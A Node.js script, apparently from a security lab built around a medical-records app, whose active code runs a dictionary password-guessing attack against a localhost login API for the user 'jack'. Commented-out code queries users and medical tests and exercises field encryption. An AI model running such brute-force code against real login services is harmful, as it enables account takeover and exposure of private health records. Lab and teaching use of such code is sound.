const fs = require("fs");
const axios = require("axios").default;
const { sequelize, User, MedicalTest } = require("./models");
const {
  fieldEncryption,
  encrypt,
  decrypt,
} = require("./services/sequelize-field-encrypt");

const crypto = require("crypto");
const { ecb: cipher } = require("./services/ciphers");

async function assertDatabaseConnectionOk() {
  console.log(`Checking database connection...`);
  try {
    await sequelize.authenticate();
    console.log("Connection has been established successfully.");
  } catch (error) {
    console.error("Unable to connect to the database:", error);
    process.exit(1);
  }
}

async function getUsers(options = {}) {
  const users = await User.findAll((options = {}));
  return users;
}

async function getUserByUsername(username, options = {}) {
  const user = await User.findOne({ ...options, where: { username } });
  return user;
}

async function getMedicalTests(options = {}) {
  const tests = await MedicalTest.findAll(options);
  return tests;
}

async function getMedicalTestsForUser(username = "") {
  let user = await getUserByUsername(username, {
    attributes: ["username"], // get only the username
    include: {
      model: MedicalTest,
      attributes: ["id", "name", "result", "timestamp", "UserId"],
    },
  });
  return user && user.MedicalTests ? user.MedicalTests : [];
}

function printMedicalTests({ username = null, tests }) {
  const results = tests.map((test) => ({
    username: !username ? test.User.username : username,
    result: test.result,
    name: test.name,
  }));
  // NOTE: table output requires Node.js version >=10.16.0
  console.table(results);
}

const options = ({ username, password, port = 8081 }) => ({
  method: "POST",
  url: `http://localhost:${port}/api/login`,
  headers: { "Content-Type": "application/json" },
  data: { username, password },
});

const testWord = async (data) => {
  const words = data.split(/\r?\n/);
  for (word of words) {
    try {
      console.log(`Testing: ${word}`);

      const { data } = await axios.request(
        options({ username: "jack", password: word })
      );

      console.log(`Response: ${JSON.stringify(data, null, 2)}\n`);
      break;
    } catch (err) {
      console.log(err.message);
      console.log(`\n`);
    }
  }
};

async function init() {
  const readStream = fs.createReadStream("dictionary.txt", {
    encoding: "utf8",
  });

  readStream.on("data", testWord);

  // await assertDatabaseConnectionOk();
  // let user = await getUserByUsername("john");
  // console.log(user);
  // user = await getUserByUsername("mirta");
  // console.log(user);
  // try {
  //   let tests = await getMedicalTests({
  //     attributes: ["UserId", "name", "result", "timestamp"],
  //     include: { model: User, attributes: ["username"] },
  //   });
  //   printMedicalTests({ tests });
  // } catch (err) {
  //   console.log(err.message);
  // }
  // let username = "mirta";
  // tests = await getMedicalTestsForUser(username);
  // printMedicalTests({ username, tests });
  // try {
  //   let message = encrypt({
  //     key: Buffer.from(process.env.DB_FIELD_ENC_KEY, "base64"),
  //     plaintext: "test",
  //   });
  //   let decryptedMessage = decrypt({
  //     key: Buffer.from(process.env.DB_FIELD_ENC_KEY, "base64"),
  //     message,
  //   });
  //   console.table({
  //     plaintext: "test",
  //     encryptedMessage: message,
  //     decryptedMessage,
  //   });
  // } catch (error) {
  //   console.log(error.message);
  // }
  // try {
  //   const { id } = await getUserByUsername("john", { attributes: ["id"] });
  //   if (id) {
  //     let newTest = MedicalTest.build({
  //       UserId: id,
  //       name: "HIV",
  //       timestamp: new Date(),
  //       // ! apparently, the value that we are setting using
  //       // ! a set() function should appear last to be able
  //       // ! to read the other fields from the model in the
  //       // ! computation
  //       result: "negative",
  //     });
  //     newTest = await newTest.save();
  //   }
  //   tests = await getMedicalTestsForUser("john");
  //   printMedicalTests({ username: "john", tests });
  // } catch (err) {
  //   console.log(err.message);
  //   // console.log(err);
  // }
}

init();